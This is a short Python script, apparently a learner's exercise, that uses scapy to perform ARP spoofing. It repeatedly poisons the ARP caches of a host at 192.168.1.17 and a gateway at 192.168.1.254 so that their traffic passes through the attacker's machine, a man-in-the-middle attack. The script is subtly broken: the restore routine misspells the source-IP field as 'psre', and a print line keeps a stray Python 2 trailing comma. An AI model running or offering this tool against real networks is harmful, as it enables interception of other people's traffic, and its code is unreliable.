#!/usr/bin/env python
import sys
import time
import scapy.all as scapy
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=2,iface="wlan0", verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip,spoof_ip):
    target_mac=get_mac(target_ip)
    packet=scapy.ARP(pdst=target_ip,hwdst=target_mac,psrc=spoof_ip)#here we dont use hwsrc coz scapy will autmatically use my mac here
    scapy.send(packet,verbose=False)
def restore(dest_ip,source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psre=source_ip, hwsrc=source_mac)#but here we need to mention sourece mac
    scapy.send(packet,count=4)

try:
    packet_sent_count = 0
    while True:
        spoof("192.168.1.17","192.168.1.254")
        spoof("192.168.1.254","192.168.1.17")
        packet_sent_count=packet_sent_count+2
        print(f"\r[+] sent "+str(packet_sent_count)), #for dynamic printing
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print(">detected ctrl+c ..... Quitting")
    restore("192.168.1.17","192.168.1.254")
